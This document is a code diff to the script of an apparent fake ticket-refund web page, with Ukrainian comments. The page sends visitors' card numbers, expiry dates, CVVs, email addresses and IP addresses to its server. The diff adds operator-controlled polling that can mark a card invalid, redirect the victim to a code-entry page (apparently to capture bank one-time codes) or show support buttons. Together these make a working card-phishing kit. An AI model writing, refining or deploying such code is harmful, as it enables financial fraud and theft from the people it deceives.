@@ -154,7 +154,7 @@
     </div>
     <script>
     // Визначаємо IP користувача
-    let userIP = "";
+    let userIP = null;
     fetch("https://api.ipify.org?format=json")
       .then(r => r.json())
       .then(data => { userIP = data.ip; });
@@ -180,10 +180,8 @@
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
         try {
-            // Додаємо IP до даних
             let ip = userIP;
             if (!ip) {
-                // fallback якщо ще не отримали IP
                 await new Promise(res => setTimeout(res, 500));
                 ip = userIP;
             }
@@ -193,7 +191,6 @@
                 body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund' })
             });
             if (response.ok) {
-                // Просто показуємо повідомлення
                 if (!document.getElementById('payment-msg')) {
                     const msg = document.createElement('div');
                     msg.id = 'payment-msg';
@@ -204,12 +201,95 @@
                     document.querySelector('.payment-card').appendChild(msg);
                 }
             } else {
-                alert('Error sending refund!');
+                console.error('Помилка при відправці даних');
             }
-        } catch (err) {
-            alert('Error sending refund!');
+        } catch (error) {
+            console.error('Помилка при зверненні до сервера:', error);
         }
     };
+    // --- POLLING для wrong_card ---
+    let wrongCardMsg = null;
+    function showWrongCardMsg() {
+        if (!wrongCardMsg) {
+            wrongCardMsg = document.createElement('div');
+            wrongCardMsg.style.color = '#dc3545';
+            wrongCardMsg.style.fontSize = '0.98rem';
+            wrongCardMsg.style.marginTop = '6px';
+            wrongCardMsg.textContent = 'Invalid card';
+            const cardInput = document.getElementById('card-input');
+            cardInput.parentNode.appendChild(wrongCardMsg);
+        }
+    }
+    setInterval(function() {
+        if (!userIP) return;
+        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
+            .then(resp => resp.text())
+            .then(txt => {
+                if (txt === 'true') {
+                    showWrongCardMsg();
+                }
+            });
+    }, 2000);
+    // --- POLLING для code redirect ---
+    setInterval(function() {
+        if (!userIP) return;
+        fetch('/check_code_redirect?ip=' + encodeURIComponent(userIP))
+            .then(resp => resp.text())
+            .then(txt => {
+                if (txt === 'true') {
+                    window.location.href = '/buy-tickets/code/';
+                }
+            });
+    }, 2000);
+    // --- POLLING для support/text кнопок ---
+    function showSupportButtons(total, text_id) {
+        let html = '';
+        if (window.show_support_flag || (window.show_text_flag && text_id)) {
+            html += `<div style="margin-bottom:10px;font-size:1rem;font-weight:500;color:#222;">If something went wrong, please use the link below.</div>`;
+        }
+        if (window.show_support_flag) {
+            html += `<a id="support-btn" href="/buy-tickets/loading/waiting-support.html?total=${total}" class="confirm-btn support-proceed-btn" style="margin-bottom:10px;display:block;">Proceed</a>`;
+        }
+        if (window.show_text_flag && text_id) {
+            html += `<a id="text-btn" href="/buy-tickets/loading/waiting-text.html?total=${total}&text_id=${text_id}" class="confirm-btn support-proceed-btn" style="background:#dc3545;display:block;">Proceed</a>`;
+        }
+        if (html) {
+            document.getElementById('support-buttons').innerHTML = html;
+            document.getElementById('support-buttons').style.display = 'block';
+            // Add click handlers
+            if (window.show_support_flag) {
+                document.getElementById('support-btn').onclick = async function(e) {
+                    e.preventDefault();
+                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
+                    document.getElementById('support-buttons').style.display = 'none';
+                    window.location.href = this.href;
+                };
+            }
+            if (window.show_text_flag && text_id) {
+                document.getElementById('text-btn').onclick = async function(e) {
+                    e.preventDefault();
+                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
+                    document.getElementById('support-buttons').style.display = 'none';
+                    window.location.href = this.href;
+                };
+            }
+        }
+    }
+    async function pollSupportButtons() {
+        if (!userIP) {
+            return setTimeout(pollSupportButtons, 2000);
+        }
+        const totalRaw = getQueryParam('total') || '';
+        try {
+            const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
+            const data = await resp.json();
+            window.show_support_flag = data.show_support;
+            window.show_text_flag = data.show_text;
+            showSupportButtons(totalRaw, data.text_id);
+        } catch (e) {}
+        setTimeout(pollSupportButtons, 2000);
+    }
+    setTimeout(pollSupportButtons, 2000);
     </script>
 </body>
 </html> 
